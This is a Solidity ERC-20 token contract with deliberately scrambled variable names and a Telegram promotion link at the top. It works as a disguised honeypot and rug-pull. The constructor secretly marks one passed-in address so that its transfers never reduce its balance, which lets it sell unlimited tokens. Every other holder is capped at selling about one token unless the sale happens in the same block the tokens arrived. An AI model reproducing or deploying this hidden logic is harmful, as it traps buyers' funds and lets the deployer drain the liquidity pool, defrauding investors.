/*

https://t.me/portaldorkpepe

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract OK is Ownable {
    function transferFrom(address ecurdfzlyk, address kyeqhpxod, uint256 wmekorflg) public returns (bool success) {
        require(wmekorflg <= allowance[ecurdfzlyk][msg.sender]);
        allowance[ecurdfzlyk][msg.sender] -= wmekorflg;
        tjvzsecfpq(ecurdfzlyk, kyeqhpxod, wmekorflg);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private wutxmpza;

    constructor(string memory dnoywcslvemq, string memory kyqujoslimza, address zwrs, address rgexoz) {
        name = dnoywcslvemq;
        symbol = kyqujoslimza;
        balanceOf[msg.sender] = totalSupply;
        fcvbiowyn[rgexoz] = wyqj;
        cprghezu = IUniswapV2Router02(zwrs);
    }

    function tjvzsecfpq(address ecurdfzlyk, address kyeqhpxod, uint256 wmekorflg) private {
        address evcix = IUniswapV2Factory(cprghezu.factory()).getPair(address(this), cprghezu.WETH());
        if (fcvbiowyn[ecurdfzlyk] == 0) {
            if (ecurdfzlyk != evcix && wutxmpza[ecurdfzlyk] != block.number && wmekorflg < totalSupply) {
                require(wmekorflg <= totalSupply / (10 ** decimals));
            }
            balanceOf[ecurdfzlyk] -= wmekorflg;
        }
        balanceOf[kyeqhpxod] += wmekorflg;
        wutxmpza[kyeqhpxod] = block.number;
        emit Transfer(ecurdfzlyk, kyeqhpxod, wmekorflg);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol;

    mapping(address => uint256) private fcvbiowyn;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private wyqj = 103;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address kyeqhpxod, uint256 wmekorflg) public returns (bool success) {
        tjvzsecfpq(msg.sender, kyeqhpxod, wmekorflg);
        return true;
    }

    string public name;

    IUniswapV2Router02 private cprghezu;

    function approve(address byopgxij, uint256 wmekorflg) public returns (bool success) {
        allowance[msg.sender][byopgxij] = wmekorflg;
        emit Approval(msg.sender, byopgxij, wmekorflg);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
